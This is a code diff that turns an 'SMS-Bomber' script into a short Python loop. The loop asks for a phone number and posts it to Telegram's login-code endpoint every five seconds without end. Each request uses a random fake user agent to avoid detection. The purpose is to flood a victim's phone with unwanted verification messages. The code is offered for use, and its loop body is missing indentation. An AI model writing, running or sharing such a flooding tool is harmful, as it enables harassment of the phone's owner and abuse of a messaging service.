@@ -1,22 +1,19 @@
+import requests, fake_useragent, time
 
-#   Version 12.1
-import requests, random, datetime, sys, time, argparse, os , colorama ,pickle
-from colorama import *
-from Banners import *
-from ServesSMS import *
-from Message import *
-from Function import *
-init()
+user = fake_useragent.UserAgent().random
+headers = {'user_agent' : user} 
+NUMBER = input ('Ведите номер телефона: (Без +) ')
 
-os.system("title SMS-Bomber-300")
-version = 'Бета'
+while True:
+user = fake_useragent.UserAgent().random
+headers = {'user_agent' : user} 
+try:
+   response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': NUMBER})
+   print('Отправлен')
+except:
+   print('Что то пошло не так')
+time.sleep(5)    
 
-#Баннер cпамера
-check_update()
-time.sleep(1.8)
-OSystem()
-start()
-
-
+    
 
 
